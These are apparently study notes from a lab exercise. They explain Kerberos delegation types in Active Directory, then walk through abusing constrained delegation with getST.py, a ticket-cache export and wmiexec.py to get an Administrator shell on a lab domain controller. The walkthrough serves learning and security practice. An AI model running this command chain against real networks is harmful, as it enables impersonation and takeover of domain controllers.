### **What Is Kerberos Delegation?**

In **Active Directory**, **Kerberos Delegation** allows a service (like a web app) to **act on behalf of a user** to access resources (like a database) on another server **using that user’s credentials**.

Think of it like this:

> 🧑 User → 🌐 Web Server → 🗄️ SQL Server
> 
> 
> Kerberos Delegation allows the web server to say:
> 
> "**Hey SQL server, I’m acting on behalf of Bob. Let me access his data.**"
> 

Without delegation, only **Bob** can directly talk to the SQL server. The web server wouldn't be able to say "I’m Bob."

### 🧠 **Why Is Delegation Useful?**

Imagine a front-end app (like Outlook Web App) needs to access a backend (like Exchange or SharePoint) **as the user** to pull their emails or files. That backend will only trust the user, not the web server.

So the server needs a way to **pretend to be the user**, **securely**, and that’s where **Kerberos Delegation** helps.

## 📦 There Are 3 Types of Delegation:

### 🟥 1. **Unconstrained Delegation (Old & Dangerous)**

🧠 **What it means:**
- Web Server can act as *any* user.
- It can talk to *any* service while pretending to be that user.
- **Very risky** because if a hacker gets control of that web server, they can **impersonate anyone** in the domain.

💬 **Real-world example:**

> Imagine a receptionist can use anyone’s badge to access any room in the office.
> 

💣 **Abuse Risk:** Super high. You get TGTs and can become Domain Admin if one logs in.

### 🟨 2. **Constrained Delegation (KCD)**

🧠 **What it means:**

- Web Server can impersonate users, but **only for specific services**.
- AD admins configure: "This server can only act on behalf of users to reach the SQL Server."

💬 **Real-world example:**

> Receptionist can only use your badge to access the kitchen, not HR, IT, or Finance.
> 

✅ Safer. Can still be abused if attacker controls the web server.

### 🟩 3. **Resource-Based Constrained Delegation (RBCD)**

🧠 **What it means:**

- Instead of **giving the receptionist power**, the **kitchen itself decides** who can act on behalf of users.
- The **target service** (SQL Server) says: "Only `WebServer01` is allowed to impersonate users to me."

💬 **Real-world example:**

> The kitchen makes a list: “Only these people are allowed to bring other people's badges here.”
> 

✅ Most secure. Used in modern systems (cloud, automation).

💣 **If attacker can change this list, they can sneak in**.

## 🔐 Big Picture: Why Does It Matter in Hacking?

If you find any of these delegation settings as an attacker:

- 🟥 **Unconstrained** → Steal tickets, impersonate Domain Admin
- 🟨 **KCD** → Abuse to impersonate users to services
- 🟩 **RBCD** → Add yourself to the list → pretend to be anyone


___

# Abuse of Kerberos Constrained Delegation**?

This is an **abuse of Kerberos Constrained Delegation (KCD)** — a misconfiguration in Active Directory where a user (in this case `DARLA_WINTERS`) is **allowed to impersonate other users** to access specific services (like file sharing on the DC).

It means:

> "This user (DARLA_WINTERS) is allowed to pretend to be anyone (even Administrator) — but only when accessing a specific service (like CIFS/file share) on a specific machine (like the DC)."
> 

### 🔍 1. Check for Constrained Delegation in BloodHound

In BloodHound, if you see:

<img width="1063" height="750" alt="image" src="https://github.com/user-attachments/assets/9b046187-3e10-4527-ad8c-d9fcf143c335" />

### 2. Impersonate Administrator Using `getST.py`

```bash
getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" thm.corp/DARLA_WINTERS:NewPassword123@
```

- `getST.py` requests a Kerberos service ticket (ST)
- It uses `DARLA_WINTERS`’s credentials
- It **impersonates the Administrator** account
- It requests access to the **CIFS** service on the Domain Controller
- The tool generates a **Kerberos ticket** and saves it to `Administrator.ccache`

### 🕒 3. Set the Ticket to Be Used

```bash
export KRB5CCNAME=Administrator.ccache
```

- This tells your tools (like `wmiexec.py`) to **use the impersonated ticket** you just saved.
- It’s like saying: “Here’s my VIP pass, use it for the next request.”

---

### 🖥️ 4. Get a Shell on the Domain Controller as Administrator

```bash
wmiexec.py -k -no-pass Administrator@haystack.thm.corp
```

- `k`: Use Kerberos
- `no-pass`: No password needed (we’re using the Kerberos ticket!)
- You now get a shell as the **Administrator** on the Domain Controller.
